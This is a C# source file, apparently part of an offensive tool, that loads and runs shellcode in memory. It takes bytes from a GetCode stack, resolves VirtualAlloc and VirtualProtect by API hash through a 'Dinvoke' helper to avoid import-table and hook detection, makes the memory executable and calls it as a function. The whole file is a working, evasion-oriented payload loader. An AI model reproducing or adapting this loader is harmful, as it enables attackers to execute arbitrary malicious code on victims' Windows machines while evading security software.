using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace NETDelegate
{
    class Execute
    {
        public static void Exec ()
        {
            Stack<byte> recvStack = GetCode.CodeStack();
            byte[] buf = new byte[recvStack.Count];
            int bufLen = recvStack.Count;
            for (int i = 0; i <= bufLen; i++)
            {
                try
                {
                    buf[i] = recvStack.Pop();
                }
                catch { break; }

            }

            //3d4f0f8e
            IntPtr GetNeedDLL = Dinvoke.GetModuleAddress("kernel32.dll");
            IntPtr FuncAddr = Dinvoke.GetExpAddressByHASH(GetNeedDLL, @"3d4f0f8e");
            VirtualAlloc virtualAlloc = (VirtualAlloc)Marshal.GetDelegateForFunctionPointer(FuncAddr, typeof(VirtualAlloc));
            IntPtr addr = virtualAlloc(0, buf.Length, 0x1000, 0x04);
            Marshal.Copy(buf, 0, addr, buf.Length);
            uint word;
            MYVIRTULProtect(addr, (UIntPtr)buf.Length, (uint)AllocationProtect.PAGE_EXECUTE, out word);
            EXEC mydel = (EXEC)Marshal.GetDelegateForFunctionPointer(addr, typeof(EXEC));
            mydel();

        }

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr VirtualAlloc(UInt32 lpStartAddr, int size, UInt32 flAllocationType, UInt32 flProtect);

        [UnmanagedFunctionPointerAttribute(CallingConvention.StdCall)]
        public delegate Int32 EXEC();

        public static bool MYVIRTULProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect)
        {
            IntPtr vppointer = Dinvoke.GetExpAddressByHASH(Dinvoke.GetModuleAddress(@"kernel32.dll"), @"ad9f9cd0");
            MYVirtualProtect mytirtualProtect = (MYVirtualProtect)Marshal.GetDelegateForFunctionPointer(vppointer, typeof(MYVirtualProtect));
            return mytirtualProtect(lpAddress, dwSize, flNewProtect, out lpflOldProtect);

        }
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate bool MYVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        public enum AllocationProtect : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }
    }
}
